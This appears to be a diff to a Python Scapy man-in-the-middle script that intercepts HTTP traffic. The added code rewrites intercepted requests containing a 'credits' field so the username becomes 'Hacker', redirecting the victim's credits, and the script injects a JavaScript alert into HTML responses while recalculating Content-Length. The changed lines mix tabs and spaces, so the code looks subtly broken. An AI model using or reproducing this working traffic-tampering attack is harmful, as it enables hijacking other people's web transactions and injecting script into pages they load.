@@ -29,7 +29,18 @@ def process_packet(packet):
                 return
             # remove Accept-Encoding header from the HTTP request
             new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
-            # set the new data
+            if '&credits=' in new_load:
+            	split = new_load.split('username=')
+            	victim = 'username='+split[1]
+            	credits = split[1].split('credits=')[1]
+            	replacement = 'username=Hacker&credits=' + credits
+            	difference = len(replacement) - len(victim)
+            	print(victim)
+            	new_load = re.sub(victim, replacement, new_load)
+            	if "Content-Length" in load:
+            		content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
+            		new_content_length = content_length + difference
+            		new_load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", new_load)
             spacket[Raw].load = new_load
             # set IP length header, checksums of IP and TCP to None
             # so Scapy will re-calculate them automatically
@@ -46,27 +57,15 @@ def process_packet(packet):
             except:
                 packet.accept()
                 return
-            # if you want to debug and see the HTML data
-            # print("Load:", load)
-            # Javascript code to add, feel free to add any Javascript code
             added_text = "<script>alert('You have been hacked');</script>"
-            # or you can add HTML as well!
-            # added_text = "<p><b>HTML Injected successfully!</b></p>"
-            # calculate the length in bytes, each character corresponds to a byte
             added_text_length = len(added_text)
-            # replace the </body> tag with the added text plus </body>
             load = load.replace("</body>", added_text + "</body>")
             if "Content-Length" in load:
-                # if Content-Length header is available
-                # get the old Content-Length value
-                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
-                # re-calculate the content length by adding the length of the injected code
-                new_content_length = content_length + added_text_length
-                # replace the new content length to the header
-                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
-                # print a message if injected
-                if added_text in load:
-                    print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
+            	content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
+            	new_content_length = content_length + added_text_length
+            	load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
+            	if added_text in load:
+            		print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
             # if you want to debug and see the modified HTML data
             # print("Load:", load)
             # set the new data
